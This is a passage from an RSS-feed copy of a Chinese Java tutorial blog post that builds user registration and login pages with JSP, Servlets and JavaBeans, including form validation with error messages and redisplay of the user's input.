        &lt;span class=&quot;co&quot;&gt;//验证表单的数据是否合法，如果不合法就跳转回去注册的页面&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;(formBean.&lt;span class=&quot;fu&quot;&gt;validate&lt;/span&gt;()==&lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;){
            request.&lt;span class=&quot;fu&quot;&gt;getRequestDispatcher&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/WEB-INF/register.jsp&quot;&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;forward&lt;/span&gt;(request, response);
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt;;
        }
        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {

            &lt;span class=&quot;co&quot;&gt;//这是第一种--------------------------&lt;/span&gt;
          &lt;span class=&quot;co&quot;&gt;/*User user = new User();&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;            user.setId(WebUtils.makeId());&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;            BeanUtils.copyProperties(user,formBean);*/&lt;/span&gt;
            &lt;span class=&quot;co&quot;&gt;//------------------------------------------&lt;/span&gt;

            &lt;span class=&quot;co&quot;&gt;//这是第二种&lt;/span&gt;
            User user1 = WebUtils.&lt;span class=&quot;fu&quot;&gt;request2Bean&lt;/span&gt;(request,User.&lt;span class=&quot;fu&quot;&gt;class&lt;/span&gt;);
            user1.&lt;span class=&quot;fu&quot;&gt;setId&lt;/span&gt;(WebUtils.&lt;span class=&quot;fu&quot;&gt;makeId&lt;/span&gt;());
            &lt;span class=&quot;co&quot;&gt;//-----------------------------------&lt;/span&gt;


            &lt;span class=&quot;co&quot;&gt;//调用service层的注册方法，实现注册&lt;/span&gt;
            ServiceBussiness serviceBussiness = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;UserServiceXML&lt;/span&gt;();
            serviceBussiness.&lt;span class=&quot;fu&quot;&gt;register&lt;/span&gt;(user1);

        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (Exception e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
        }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;hr/&gt;&lt;p&gt;现在还有问题，&lt;strong&gt;如果我填写信息不合法，提交给服务器验证以后，服务器应该告诉用户哪个信息不合法，而不是直接把跳转回注册界面，把所有的信息全部清空，让用户重新填写！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/wsD1xDd.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们应该这样做：&lt;strong&gt;当发现用户输入的信息不合法时，把错误的信息记录下来，等到返回注册页面，就提示用户哪里出错了！&lt;/strong&gt;&lt;/p&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;在FormBean对象中添加一个HashMap集合（因为等会还要根据关键字把错误信息显示给用户！）&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;FormBean的全部代码如下：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;20&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
    &lt;span class=&quot;co&quot;&gt;//表单提交过来的数据全都是String类型的，birthday也不例外！&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String username;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String password;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String password2;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String email;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String birthday;

    &lt;span class=&quot;co&quot;&gt;//记录错误的信息&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; HashMap&amp;lt;String, String&amp;gt; error = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; HashMap&amp;lt;&amp;gt;();
    
    
    &lt;span class=&quot;co&quot;&gt;/*用于判断表单提交过来的数据是否合法*/&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;validate&lt;/span&gt;() {

        &lt;span class=&quot;co&quot;&gt;//用户名不能为空，并且要是3-8的字符 abcdABcd&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;username&lt;/span&gt; == &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; || &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;username&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;trim&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;)) {

            error.&lt;span class=&quot;fu&quot;&gt;put&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;用户名不能为空，并且要是3-8的字符&quot;&lt;/span&gt;);
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;

        } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;username&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;matches&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;[a-zA-Z]{3,8}&quot;&lt;/span&gt;)) {
                error.&lt;span class=&quot;fu&quot;&gt;put&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;用户名不能为空，并且要是3-8的字符&quot;&lt;/span&gt;);
                &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
            }
        }

        &lt;span class=&quot;co&quot;&gt;//密码不能为空，并且要是3-8的数字&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password&lt;/span&gt; == &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; || &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;trim&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;)) {
            error.&lt;span class=&quot;fu&quot;&gt;put&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;password&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;密码不能为空，并且要是3-8的数字&quot;&lt;/span&gt;);
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
        } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;matches&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;d{3,8}&quot;&lt;/span&gt;)) {
                error.&lt;span class=&quot;fu&quot;&gt;put&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;password&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;密码不能为空，并且要是3-8的数字&quot;&lt;/span&gt;);
                &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
            }
        }

        &lt;span class=&quot;co&quot;&gt;//两次密码要一致&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password2&lt;/span&gt; != &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; !&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password2&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;trim&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;)) {
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password2&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;password&lt;/span&gt;)) {
                error.&lt;span class=&quot;fu&quot;&gt;put&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;password2&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;两次密码要一致&quot;&lt;/span&gt;);
                &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
            }
        }

        &lt;span class=&quot;co&quot;&gt;//邮箱可以为空，如果为空就必须合法&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;email&lt;/span&gt; != &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; !&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;email&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;trim&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;)) {
                &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;email&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;matches&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;w+@&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;w+(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;w+)+&quot;&lt;/span&gt;)) {

                    error.&lt;span class=&quot;fu&quot;&gt;put&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;email&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;邮箱不合法！&quot;&lt;/span&gt;);
                    &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
                }
        }

        &lt;span class=&quot;co&quot;&gt;//日期可以为空，如果为空就必须合法&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;birthday&lt;/span&gt; != &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; !&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;birthday&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;trim&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;equals&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&quot;&lt;/span&gt;)) {

            &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {
                DateLocaleConverter dateLocaleConverter = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;DateLocaleConverter&lt;/span&gt;();
                dateLocaleConverter.&lt;span class=&quot;fu&quot;&gt;convert&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;birthday&lt;/span&gt;);
            } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (Exception e) {

                error.&lt;span class=&quot;fu&quot;&gt;put&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;birthday&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;日期不合法！&quot;&lt;/span&gt;);
                &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;;
            }
        }

        &lt;span class=&quot;co&quot;&gt;//如果上面都没有执行，那么就是合法的了，返回true&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;true&lt;/span&gt;;
    }

    &lt;span class=&quot;co&quot;&gt;//.....各种的setter和getter&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;在跳转到注册页面之前，把formbean对象存到request域中。在注册页面就可以把错误的信息取出来(使用EL表达式)！&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;处理表单的Servlet的部分代码&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;12&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
        &lt;span class=&quot;co&quot;&gt;//验证表单的数据是否合法，如果不合法就跳转回去注册的页面&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;(formBean.&lt;span class=&quot;fu&quot;&gt;validate&lt;/span&gt;()==&lt;span class=&quot;kw&quot;&gt;false&lt;/span&gt;){

            &lt;span class=&quot;co&quot;&gt;//在跳转之前，把formbean对象传递给注册页面&lt;/span&gt;
            request.&lt;span class=&quot;fu&quot;&gt;setAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;formbean&quot;&lt;/span&gt;, formBean);
            request.&lt;span class=&quot;fu&quot;&gt;getRequestDispatcher&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/WEB-INF/register.jsp&quot;&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;forward&lt;/span&gt;(request, response);
            &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt;;
        }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;在注册页面中，使用EL表达式把错误的信息写出来&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/jW6HbtX.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/ENL5pFb.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/lX7KfKl.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;做到这里，还是有丢丢的问题，我们不应该把用户输入的数据全部清空的！你想想，&lt;strong&gt;如果用户注册需要输入多个信息，仅仅一个出错了，就把全部信息清空，要他重新填写，这样是不合理的！&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;我们在各个的输入项中使用EL表达式回显数据就行了&lt;/strong&gt;！&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/8zEBQMo.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/IhYnLpK.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;还没有完善，&lt;strong&gt;细心的朋友可以发现，上面图的日期也是错误的，但是没一次性标记出来给用户！要改也十分简单：在验证的时候，不要先急着return false 用一个布尔型变量记住，最后返回布尔型的变量即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/fBAgAwf.png&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;无论注册成功还是失败都需要给用户一个友好界面的！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/pOVvSFI.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;登陆界面&quot;&gt;5.2登陆界面&lt;/h4&gt;
&lt;p&gt;登陆和注册是类似的，我们按着注册的步骤来写就对了！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先写一个提供登陆界面的Servlet&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

        &lt;span class=&quot;co&quot;&gt;//直接跳转到登陆界面&lt;/span&gt;
        request.&lt;span class=&quot;fu&quot;&gt;getRequestDispatcher&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/WEB-INF/login.jsp&quot;&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;forward&lt;/span&gt;(request, response);&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;写登陆界面&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;这是登陆界面&lt;span class=&quot;kw&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

&lt;span class=&quot;kw&quot;&gt;&amp;lt;form&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; action=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;${pageContext.request.contextPath}/LoginServlet&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; method=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;table&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;用户名&lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;密码&lt;span class=&quot;kw&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;提交&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;reset&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;重置&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;写处理登陆表单的Servlet&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;15&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
        &lt;span class=&quot;co&quot;&gt;//获取提交过来的数据&lt;/span&gt;
        String username = request.&lt;span class=&quot;fu&quot;&gt;getParameter&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;);
        String password = request.&lt;span class=&quot;fu&quot;&gt;getParameter&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;password&quot;&lt;/span&gt;);

        &lt;span class=&quot;co&quot;&gt;//调用service层的方法，去查询数据库（XML）是否有该条记录&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {
            ServiceBussiness serviceBussiness = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;UserServiceXML&lt;/span&gt;();
            User user = serviceBussiness.&lt;span class=&quot;fu&quot;&gt;login&lt;/span&gt;(username, password);

            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (user == &lt;span class=&quot;kw&quot;&gt;null&lt;/span&gt;) {
                request.&lt;span class=&quot;fu&quot;&gt;setAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;message&quot;&lt;/span&gt;, &lt;span class=&quot;st&quot;&gt;&quot;用户名或密码是错的&quot;&lt;/span&gt;);
            } &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt; {
                request.&lt;span class=&quot;fu&quot;&gt;setAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;message&quot;&lt;/span&gt;,&lt;span class=&quot;st&quot;&gt;&quot;登陆成功&quot;&lt;/span&gt;);
            }
        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (Exception e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
            request.&lt;span class=&quot;fu&quot;&gt;setAttribute&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;message&quot;&lt;/span&gt;,&lt;span class=&quot;st&quot;&gt;&quot;登陆失败咯&quot;&lt;/span&gt;);
        }
        request.&lt;span class=&quot;fu&quot;&gt;getRequestDispatcher&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/message.jsp&quot;&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;forward&lt;/span&gt;(request, response);&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/lP9ALK0.gif&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h4 id=&quot;把注册和登陆都挂在首页上&quot;&gt;5.3把注册和登陆都挂在首页上&lt;/h4&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;
  &lt;span class=&quot;kw&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;这是首页！&lt;span class=&quot;kw&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;kw&quot;&gt;&amp;lt;a&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; href=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;${pageContext.request.contextPath}/LoginUIServlet&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;登陆&lt;span class=&quot;kw&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;kw&quot;&gt;&amp;lt;a&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; href=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;${pageContext.request.contextPath}/RegisterUIServlet&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;注册&lt;span class=&quot;kw&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;kw&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/0hUhehD.png&quot;/&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;使用JSP+JavaBean开发一个简单计算器，是非常容易的，显示页面和请求都是交由JSP来做。没有什么新的知识点，用一些JSP行为就能完成了。&lt;/li&gt;
&lt;li&gt;MVC模式开发使用Servlet来做处理请求，代码量略大，但层次清晰&lt;/li&gt;
&lt;li&gt;使用BeanUtils开发组件可以将request请求的参数封装到JavaBean对象中，Date属性要另外处理&lt;/li&gt;
&lt;li&gt;校验的功能也是使用一个JavaBean来完成，目的就是为了可重用性，职责分工。同时，我们可以在该JavaBean设置一个Map集合来保存错误的信息，以便在前台上展示错误信息。&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;如果文章有错的地方欢迎指正，大家互相交流。习惯在微信看技术文章的同学，可以关注微信公众号:&lt;strong&gt;Java3y&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Thu, 22 Feb 2018 09:09:00 +0000</pubDate>
<dc:creator>Java3y</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Java3y/p/8459496.html</dc:identifier>
</item>
</channel>
</rss>